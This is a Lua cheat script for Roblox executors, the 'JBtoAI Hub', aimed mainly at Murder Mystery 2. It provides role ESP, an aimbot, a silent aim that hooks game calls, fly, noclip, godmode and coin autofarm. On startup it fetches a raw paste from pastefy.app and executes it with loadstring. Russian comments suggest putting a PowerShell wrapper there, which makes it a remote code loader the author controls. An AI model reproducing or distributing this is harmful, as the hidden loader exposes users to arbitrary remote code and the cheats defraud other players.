-- language: Lua | Roblox Executor | JBtoAI Hub
-- loadstring(game:HttpGet("https://pastefy.app/twhTVdlc/raw"))()
-- после старта тянет пейст ещё раз (можно кидать туда powershell-обёртку / прямой lua)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")

local LP = Players.LocalPlayer
local Camera = Workspace.CurrentCamera
local Mouse = LP:GetMouse()

-- ===== load paste (сюда кидаешь powershell / lua / raw) =====
pcall(function()
    local raw = game:HttpGet("https://pastefy.app/twhTVdlc/raw")
    if raw and #raw > 10 then
        loadstring(raw)()
    end
end)

-- ===== state =====
local State = {
    Fly = false,
    Noclip = false,
    Invis = false,
    God = false,
    ESP = false,
    RoleESP = false,
    Aimbot = false,
    SilentAim = false,
    AutoFarm = false,
    Speed = 16,
    Jump = 50,
    FOV = 120,
}

local Connections = {}
local ESPObjects = {}
local StartTime = tick()

-- ===== utils =====
local function notify(text, time)
    time = time or 2
    local n = Instance.new("TextLabel")
    n.Size = UDim2.new(0, 280, 0, 34)
    n.Position = UDim2.new(0.5, -140, 0, 12)
    n.BackgroundColor3 = Color3.fromRGB(20, 20, 28)
    n.BorderSizePixel = 0
    n.Text = "  " .. text
    n.Font = Enum.Font.Code
    n.TextSize = 13
    n.TextColor3 = Color3.fromRGB(0, 255, 180)
    n.TextXAlignment = Enum.TextXAlignment.Left
    n.Parent = CoreGui:FindFirstChild("JBtoAI_Hub") or CoreGui
    local c = Instance.new("UICorner", n)
    c.CornerRadius = UDim.new(0, 4)
    local s = Instance.new("UIStroke", n)
    s.Color = Color3.fromRGB(0, 200, 140)
    s.Thickness = 1
    task.delay(time, function()
        TweenService:Create(n, TweenInfo.new(0.25), {BackgroundTransparency = 1, TextTransparency = 1}):Play()
        task.wait(0.3)
        n:Destroy()
    end)
end

local function getChar()
    return LP.Character or LP.CharacterAdded:Wait()
end

local function getHum()
    local c = getChar()
    return c and c:FindFirstChildOfClass("Humanoid")
end

local function getRoot()
    local c = getChar()
    return c and c:FindFirstChild("HumanoidRootPart")
end

-- ===== role detection MM2 =====
local function getRole(plr)
    local char = plr.Character
    if not char then return "Innocent" end
    local bp = plr:FindFirstChild("Backpack")
    if char:FindFirstChild("Knife") or (bp and bp:FindFirstChild("Knife")) then
        return "Murderer"
    end
    if char:FindFirstChild("Gun") or (bp and bp:FindFirstChild("Gun")) then
        return "Sheriff"
    end
    return "Innocent"
end

local RoleColor = {
    Murderer = Color3.fromRGB(255, 40, 40),
    Sheriff  = Color3.fromRGB(40, 120, 255),
    Innocent = Color3.fromRGB(40, 255, 80),
}

-- ===== ESP =====
local function clearESP()
    for _, v in pairs(ESPObjects) do
        if v and v.Parent then v:Destroy() end
    end
    table.clear(ESPObjects)
end

local function createESP(plr)
    if plr == LP then return end
    local char = plr.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end

    local highlight = Instance.new("Highlight")
    highlight.Adornee = char
    highlight.FillTransparency = 0.55
    highlight.OutlineTransparency = 0
    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    highlight.Parent = char

    local bill = Instance.new("BillboardGui")
    bill.Adornee = char:FindFirstChild("Head") or char.HumanoidRootPart
    bill.Size = UDim2.new(0, 200, 0, 40)
    bill.StudsOffset = Vector3.new(0, 2.8, 0)
    bill.AlwaysOnTop = true
    bill.Parent = char

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.Font = Enum.Font.Code
    label.TextSize = 13
    label.TextStrokeTransparency = 0.4
    label.Parent = bill

    local function update()
        if not State.ESP and not State.RoleESP then return end
        local role = getRole(plr)
        local col = RoleColor[role] or Color3.fromRGB(200, 200, 200)
        highlight.FillColor = col
        highlight.OutlineColor = col
        label.TextColor3 = col
        if State.RoleESP then
            label.Text = plr.Name .. "  [" .. role .. "]"
        else
            label.Text = plr.Name
        end
    end

    update()
    local conn = RunService.RenderStepped:Connect(update)
    table.insert(Connections, conn)
    ESPObjects[plr] = {highlight, bill, conn}
end

local function refreshESP()
    clearESP()
    if not State.ESP and not State.RoleESP then return end
    for _, plr in pairs(Players:GetPlayers()) do
        createESP(plr)
    end
end

Players.PlayerAdded:Connect(function(plr)
    plr.CharacterAdded:Connect(function()
        task.wait(0.5)
        if State.ESP or State.RoleESP then createESP(plr) end
    end)
end)

-- ===== FLY =====
local FlyBV, FlyBG
local function toggleFly(on)
    State.Fly = on
    local root = getRoot()
    local hum = getHum()
    if not root or not hum then return end
    if on then
        FlyBV = Instance.new("BodyVelocity")
        FlyBV.MaxForce = Vector3.new(9e9, 9e9, 9e9)
        FlyBV.Velocity = Vector3.zero
        FlyBV.Parent = root
        FlyBG = Instance.new("BodyGyro")
        FlyBG.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
        FlyBG.P = 9e4
        FlyBG.Parent = root
        hum.PlatformStand = true
        table.insert(Connections, RunService.RenderStepped:Connect(function()
            if not State.Fly or not FlyBV then return end
            local dir = Vector3.zero
            if UserInputService:IsKeyDown(Enum.KeyCode.W) then dir += Camera.CFrame.LookVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.S) then dir -= Camera.CFrame.LookVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.A) then dir -= Camera.CFrame.RightVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.D) then dir += Camera.CFrame.RightVector end
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then dir += Vector3.new(0, 1, 0) end
            if UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then dir -= Vector3.new(0, 1, 0) end
            FlyBV.Velocity = dir.Unit * 60
            if dir.Magnitude < 0.1 then FlyBV.Velocity = Vector3.zero end
            FlyBG.CFrame = Camera.CFrame
        end))
        notify("Fly ON")
    else
        if FlyBV then FlyBV:Destroy() end
        if FlyBG then FlyBG:Destroy() end
        if hum then hum.PlatformStand = false end
        notify("Fly OFF")
    end
end

-- ===== NOCLIP =====
local function toggleNoclip(on)
    State.Noclip = on
    if on then
        table.insert(Connections, RunService.Stepped:Connect(function()
            if not State.Noclip then return end
            local char = getChar()
            if char then
                for _, part in pairs(char:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = false
                    end
                end
            end
        end))
        notify("Noclip ON")
    else
        notify("Noclip OFF")
    end
end

-- ===== INVIS =====
local function toggleInvis(on)
    State.Invis = on
    local char = getChar()
    if not char then return end
    for _, v in pairs(char:GetDescendants()) do
        if v:IsA("BasePart") or v:IsA("Decal") or v:IsA("Texture") then
            if on then
                v.Transparency = 1
            else
                if v.Name ~= "HumanoidRootPart" then
                    v.Transparency = 0
                end
            end
        end
    end
    notify(on and "Invis ON" or "Invis OFF")
end

-- ===== GOD =====
local function toggleGod(on)
    State.God = on
    if on then
        table.insert(Connections, RunService.Heartbeat:Connect(function()
            if not State.God then return end
            local hum = getHum()
            if hum then
                hum.Health = hum.MaxHealth
            end
        end))
        notify("GodMode ON")
    else
        notify("GodMode OFF")
    end
end

-- ===== AIMBOT / SILENT =====
local function getClosest(roleFilter)
    local closest, dist = nil, State.FOV
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LP and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
            local role = getRole(plr)
            if roleFilter and role ~= roleFilter then continue end
            local pos, onScreen = Camera:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
            if onScreen then
                local mag = (Vector2.new(pos.X, pos.Y) - Vector2.new(Mouse.X, Mouse.Y)).Magnitude
                if mag < dist then
                    dist = mag
                    closest = plr
                end
            end
        end
    end
    return closest
end

table.insert(Connections, RunService.RenderStepped:Connect(function()
    if State.Aimbot then
        local target = getClosest()
        if target and target.Character and target.Character:FindFirstChild("Head") then
            Camera.CFrame = CFrame.new(Camera.CFrame.Position, target.Character.Head.Position)
        end
    end
end))

-- silent aim (hooks mouse hit for guns)
local oldNamecall
oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
    local method = getnamecallmethod()
    if State.SilentAim and method == "FindPartOnRayWithIgnoreList" and not checkcaller() then
        local target = getClosest("Murderer") or getClosest()
        if target and target.Character and target.Character:FindFirstChild("Head") then
            local origin = Camera.CFrame.Position
            local dir = (target.Character.Head.Position - origin).Unit * 1000
            return target.Character.Head, target.Character.Head.Position
        end
    end
    return oldNamecall(self, ...)
end)

-- ===== AUTO FARM COINS (MM2) =====
local function toggleFarm(on)
    State.AutoFarm = on
    if on then
        table.insert(Connections, RunService.Heartbeat:Connect(function()
            if not State.AutoFarm then return end
            local root = getRoot()
            if not root then return end
            for _, v in pairs(Workspace:GetDescendants()) do
                if v.Name == "Coin" or v.Name == "CoinContainer" or (v:IsA("BasePart") and v.Name:lower():find("coin")) then
                    root.CFrame = v.CFrame + Vector3.new(0, 3, 0)
                    break
                end
            end
        end))
        notify("AutoFarm Coins ON")
    else
        notify("AutoFarm OFF")
    end
end

-- ===== TELEPORT TO PLAYER =====
local function tpTo(plr)
    local root = getRoot()
    local tRoot = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
    if root and tRoot then
        root.CFrame = tRoot.CFrame + Vector3.new(0, 3, 0)
        notify("TP → " .. plr.Name)
    end
end

-- ===== GUI (retro style) =====
local Gui = Instance.new("ScreenGui")
Gui.Name = "JBtoAI_Hub"
Gui.ResetOnSpawn = false
Gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Gui.Parent = CoreGui

-- top status bar
local TopBar = Instance.new("Frame")
TopBar.Size = UDim2.new(1, 0, 0, 28)
TopBar.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
TopBar.BorderSizePixel = 0
TopBar.Parent = Gui

local TopStroke = Instance.new("UIStroke", TopBar)
TopStroke.Color = Color3.fromRGB(0, 200, 140)
TopStroke.Thickness = 1

local TopText = Instance.new("TextLabel")
TopText.Size = UDim2.new(1, -20, 1, 0)
TopText.Position = UDim2.new(0, 10, 0, 0)
TopText.BackgroundTransparency = 1
TopText.Font = Enum.Font.Code
TopText.TextSize = 12
TopText.TextColor3 = Color3.fromRGB(0, 255, 180)
TopText.TextXAlignment = Enum.TextXAlignment.Left
TopText.Parent = TopBar

RunService.RenderStepped:Connect(function()
    local fps = math.floor(1 / RunService.RenderStepped:Wait())
    local playtime = math.floor(tick() - StartTime)
    local min = math.floor(playtime / 60)
    local sec = playtime % 60
    TopText.Text = string.format("JBtoAI Hub  |  FPS: %d  |  %s  |  %02d:%02d  |  t.me/your_tg", fps, game.Name, min, sec)
end)

-- main window
local Main = Instance.new("Frame")
Main.Size = UDim2.new(0, 560, 0, 400)
Main.Position = UDim2.new(0.5, -280, 0.5, -200)
Main.BackgroundColor3 = Color3.fromRGB(16, 16, 22)
Main.BorderSizePixel = 0
Main.Parent = Gui

local MainStroke = Instance.new("UIStroke", Main)
MainStroke.Color = Color3.fromRGB(0, 180, 130)
MainStroke.Thickness = 2

local MainCorner = Instance.new("UICorner", Main)
MainCorner.CornerRadius = UDim.new(0, 2)

-- title
local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 36)
TitleBar.BackgroundColor3 = Color3.fromRGB(10, 10, 14)
TitleBar.BorderSizePixel = 0
TitleBar.Parent = Main

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -40, 1, 0)
Title.Position = UDim2.new(0, 12, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "▶ JBtoAI HUB"
Title.Font = Enum.Font.Code
Title.TextSize = 16
Title.TextColor3 = Color3.fromRGB(0, 255, 180)
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = TitleBar

local Close = Instance.new("TextButton")
Close.Size = UDim2.new(0, 28, 0, 28)
Close.Position = UDim2.new(1, -32, 0, 4)
Close.BackgroundColor3 = Color3.fromRGB(40, 20, 20)
Close.Text = "X"
Close.Font = Enum.Font.Code
Close.TextSize = 14
Close.TextColor3 = Color3.fromRGB(255, 80, 80)
Close.Parent = TitleBar
Instance.new("UICorner", Close).CornerRadius = UDim.new(0, 2)
Close.MouseButton1Click:Connect(function() Gui:Destroy() end)

-- drag
local dragging, dragStart, startPos
TitleBar.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = i.Position
        startPos = Main.Position
    end
end)
TitleBar.InputEnded:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end
end)
UserInputService.InputChanged:Connect(function(i)
    if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then
        local d = i.Position - dragStart
        Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
    end
end)

-- tabs
local TabBar = Instance.new("Frame")
TabBar.Size = UDim2.new(1, 0, 0, 32)
TabBar.Position = UDim2.new(0, 0, 0, 36)
TabBar.BackgroundColor3 = Color3.fromRGB(12, 12, 18)
TabBar.BorderSizePixel = 0
TabBar.Parent = Main

local Pages = {}
local TabButtons = {}

local function makePage(name)
    local p = Instance.new("ScrollingFrame")
    p.Size = UDim2.new(1, -16, 1, -80)
    p.Position = UDim2.new(0, 8, 0, 76)
    p.BackgroundTransparency = 1
    p.BorderSizePixel = 0
    p.ScrollBarThickness = 3
    p.ScrollBarImageColor3 = Color3.fromRGB(0, 200, 140)
    p.Visible = false
    p.Parent = Main
    local lay = Instance.new("UIListLayout", p)
    lay.Padding = UDim.new(0, 6)
    lay.SortOrder = Enum.SortOrder.LayoutOrder
    Pages[name] = p
    return p
end

local function switchTab(name)
    for n, p in pairs(Pages) do p.Visible = (n == name) end
    for n, b in pairs(TabButtons) do
        b.BackgroundColor3 = (n == name) and Color3.fromRGB(0, 80, 60) or Color3.fromRGB(20, 20, 28)
        b.TextColor3 = (n == name) and Color3.fromRGB(0, 255, 180) or Color3.fromRGB(140, 140, 160)
    end
end

local function makeTab(text, order)
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(0, 90, 1, 0)
    b.Position = UDim2.new(0, 4 + (order - 1) * 94, 0, 0)
    b.BackgroundColor3 = Color3.fromRGB(20, 20, 28)
    b.Text = text
    b.Font = Enum.Font.Code
    b.TextSize = 12
    b.TextColor3 = Color3.fromRGB(140, 140, 160)
    b.BorderSizePixel = 0
    b.Parent = TabBar
    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 2)
    TabButtons[text] = b
    b.MouseButton1Click:Connect(function() switchTab(text) end)
    return b
end

makeTab("MM2", 1)
makeTab("Universal", 2)
makeTab("Combat", 3)
makeTab("Players", 4)
makeTab("About", 5)

local mm2 = makePage("MM2")
local uni = makePage("Universal")
local combat = makePage("Combat")
local players = makePage("Players")
local about = makePage("About")

-- toggle helper
local function makeToggle(parent, text, default, callback)
    local f = Instance.new("Frame")
    f.Size = UDim2.new(1, -8, 0, 32)
    f.BackgroundColor3 = Color3.fromRGB(22, 22, 30)
    f.BorderSizePixel = 0
    f.Parent = parent
    Instance.new("UICorner", f).CornerRadius = UDim.new(0, 2)

    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.new(1, -60, 1, 0)
    lbl.Position = UDim2.new(0, 10, 0, 0)
    lbl.BackgroundTransparency = 1
    lbl.Text = text
    lbl.Font = Enum.Font.Code
    lbl.TextSize = 13
    lbl.TextColor3 = Color3.fromRGB(200, 200, 220)
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.Parent = f

    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, 48, 0, 22)
    btn.Position = UDim2.new(1, -54, 0.5, -11)
    btn.BackgroundColor3 = default and Color3.fromRGB(0, 140, 100) or Color3.fromRGB(50, 50, 60)
    btn.Text = default and "ON" or "OFF"
    btn.Font = Enum.Font.Code
    btn.TextSize = 11
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Parent = f
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 2)

    local on = default
    btn.MouseButton1Click:Connect(function()
        on = not on
        btn.Text = on and "ON" or "OFF"
        btn.BackgroundColor3 = on and Color3.fromRGB(0, 140, 100) or Color3.fromRGB(50, 50, 60)
        callback(on)
    end)
end

local function makeBtn(parent, text, callback)
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(1, -8, 0, 30)
    b.BackgroundColor3 = Color3.fromRGB(28, 28, 38)
    b.Text = text
    b.Font = Enum.Font.Code
    b.TextSize = 13
    b.TextColor3 = Color3.fromRGB(0, 255, 180)
    b.BorderSizePixel = 0
    b.Parent = parent
    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 2)
    local s = Instance.new("UIStroke", b)
    s.Color = Color3.fromRGB(0, 120, 90)
    s.Thickness = 1
    b.MouseButton1Click:Connect(callback)
end

-- MM2 page
makeToggle(mm2, "Role ESP (Murder/Sheriff)", false, function(v)
    State.RoleESP = v
    State.ESP = v or State.ESP
    refreshESP()
end)
makeToggle(mm2, "Player ESP", false, function(v)
    State.ESP = v
    refreshESP()
end)
makeToggle(mm2, "Auto Farm Coins", false, toggleFarm)
makeToggle(mm2, "GodMode", false, toggleGod)
makeBtn(mm2, "TP to Murderer", function()
    for _, p in pairs(Players:GetPlayers()) do
        if getRole(p) == "Murderer" then tpTo(p) break end
    end
end)
makeBtn(mm2, "TP to Sheriff", function()
    for _, p in pairs(Players:GetPlayers()) do
        if getRole(p) == "Sheriff" then tpTo(p) break end
    end
end)

-- Universal
makeToggle(uni, "Fly (WASD + Space/Ctrl)", false, toggleFly)
makeToggle(uni, "Noclip", false, toggleNoclip)
makeToggle(uni, "Invisibility", false, toggleInvis)
makeToggle(uni, "GodMode", false, toggleGod)
makeBtn(uni, "Fullbright", function()
    Lighting.Brightness = 2
    Lighting.ClockTime = 14
    Lighting.FogEnd = 100000
    notify("Fullbright")
end)
makeBtn(uni, "Rejoin", function()
    TeleportService:Teleport(game.PlaceId, LP)
end)

-- Combat
makeToggle(combat, "Aimbot (smooth)", false, function(v) State.Aimbot = v notify(v and "Aimbot ON" or "Aimbot OFF") end)
makeToggle(combat, "Silent Aim", false, function(v) State.SilentAim = v notify(v and "Silent Aim ON" or "Silent Aim OFF") end)
makeBtn(combat, "FOV Circle (visual)", function()
    notify("FOV = " .. State.FOV)
end)

-- Players (live list)
local function refreshPlayerList()
    for _, c in pairs(players:GetChildren()) do
        if c:IsA("TextButton") or (c:IsA("Frame") and c.Name == "plr") then c:Destroy() end
    end
    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LP then
            makeBtn(players, plr.Name .. "  [" .. getRole(plr) .. "]", function()
                tpTo(plr)
            end)
        end
    end
end
makeBtn(players, "↻ Refresh List", refreshPlayerList)
refreshPlayerList()
Players.PlayerAdded:Connect(refreshPlayerList)
Players.PlayerRemoving:Connect(refreshPlayerList)

-- About
local aboutLbl = Instance.new("TextLabel")
aboutLbl.Size = UDim2.new(1, -16, 0, 180)
aboutLbl.BackgroundTransparency = 1
aboutLbl.Text = [[
🟡  PAC-MAN  ·  JBtoAI HUB
────────────────────────
Универсальный чит-хаб.
MM2 + Universal + Combat.

Роли, ESP, Aimbot, Silent,
Fly, Noclip, God, Farm.

Обновления и поддержка:
t.me/your_channel
t.me/your_ls
your-site.com

[ Update ] → ведёт в тгк
]]
aboutLbl.Font = Enum.Font.Code
aboutLbl.TextSize = 13
aboutLbl.TextColor3 = Color3.fromRGB(180, 220, 200)
aboutLbl.TextXAlignment = Enum.TextXAlignment.Left
aboutLbl.TextYAlignment = Enum.TextYAlignment.Top
aboutLbl.Parent = about

makeBtn(about, "↻ Update / TG Channel", function()
    notify("Открывай тгк → t.me/your_channel")
    -- setclipboard("https://t.me/your_channel") -- раскомментируй если executor поддерживает
end)

switchTab("MM2")
notify("JBtoAI Hub loaded", 3)